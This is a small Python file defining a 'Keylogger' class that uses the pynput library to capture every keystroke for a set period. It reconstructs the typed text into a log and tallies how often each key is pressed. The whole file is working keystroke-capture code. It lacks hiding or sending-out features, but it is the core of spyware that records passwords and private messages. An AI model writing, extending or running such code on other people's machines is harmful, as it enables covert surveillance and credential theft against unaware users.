from pynput.keyboard import Listener
import datetime

class Keylogger():
    def __init__ (self, time):
        self.__log = ""
        self.__start = 1
        self.__time = time
        self.__keys = {}
    def setTime(self, value):
        self.__time = value    
    def run(self):
        self.__start = datetime.datetime.now()
        def anonymous(key):
            now = datetime.datetime.now()
            key = str(key)
            if now.timestamp() - self.__start.timestamp() >= self.__time:
                listener.stop()
            if(key not in self.__keys):
                self.__keys[key] = 1
            else:
                self.__keys[key] += 1

            if key == "Key.space":
                key = " "
            if key == "Key.enter":
                key = "\n"
            if key == "Key.backspace":
                self.__log = self.__log[:-1]
            elif "Key." not in key:
                key = key.replace("'","")
                self.__log += key

        with Listener (on_press=anonymous) as listener:
            listener.join()
        return self.__keys
            
    def getLog(self):
        return self.__log
    
    def getKeys(self):
        return self.__keys

